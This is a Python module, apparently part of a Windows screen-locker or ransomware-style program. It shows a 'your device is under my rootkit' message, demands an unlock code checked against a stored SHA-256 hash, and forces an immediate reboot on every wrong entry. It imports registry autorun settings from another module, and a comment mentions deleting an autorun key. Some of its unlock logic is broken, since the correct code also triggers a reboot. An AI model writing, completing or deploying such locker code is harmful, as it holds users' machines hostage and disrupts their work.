import keyboard

from main import WINREG_BRANCH, WINREG_DWORD, UNLOCK_HASH, MASK_FILE, APPDATA_PATH
import winreg
import os
import sys
import hashlib

MSG_STR = "HELLO, PEOPLE!\n" \
          "I so sorry, that your device under my rootkit, but it help me know more about cybercrime" \
          "and protect information\n" \
          "If you would like unlock your device contact with AV manufacture or enter unlock code \\/\\/"


def unlock_me(accepter=False):
    if accepter is None:
        # TODO : Delete HKEY Autorun
        try:
            os.system("COLOR 0F")
            os.system("shutdown /r /t 0")
        except:
            pass
        return False
    else:
        print("Fuck you, Kaspersky!")


def main_unlocker():
    try:
        os.system("COLOR 4F")
    except:
        pass
    finally:
        print("WELCOME TO HELL")

    while True:
        print(MSG_STR)
        unlock = input("CODE >>> ")
        try:
            os.system("CLS")
        except:
            try:
                os.system("CLEAR")
            except:
                pass

        unlock_hash = hashlib.sha256(unlock.encode()).hexdigest()
        if unlock_hash == UNLOCK_HASH:
            unlock_me(None)
            if not unlock_me():
                try:
                    os.system("shutdown /a")
                except:
                    os.system("reboot")

                print("Goodbye, I love you too, so much, really, and I am sorry about this exp.")
                keyboard.wait("ESC")
                break
        else:
            try:
                os.system("shutdown /r /t 0")
            except:
                os.system("reboot")
            unlock_me()



if __name__ == "__main__":
    main_unlocker()
